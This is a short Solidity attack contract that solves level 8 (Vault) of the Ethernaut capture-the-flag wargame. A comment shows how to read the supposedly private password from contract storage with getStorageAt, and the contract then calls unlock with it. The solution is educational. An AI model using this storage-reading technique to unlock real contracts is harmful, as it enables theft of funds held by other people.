// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IVault.sol";

/**
 * @title Vault Attack (Ethernaut Challenge Level 8 - Vault)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 8
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188
 */
contract VaultAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @dev To get password from storage, you can run this script in browser:
     * > await web3.eth.getStorageAt(contract.address, 1)
     * @param target Address of target contract
     */
    function attack(IVault target, bytes32 password) external {
        target.unlock(password);

        require(!target.locked(), "Vault: Attack failed");
    }
}
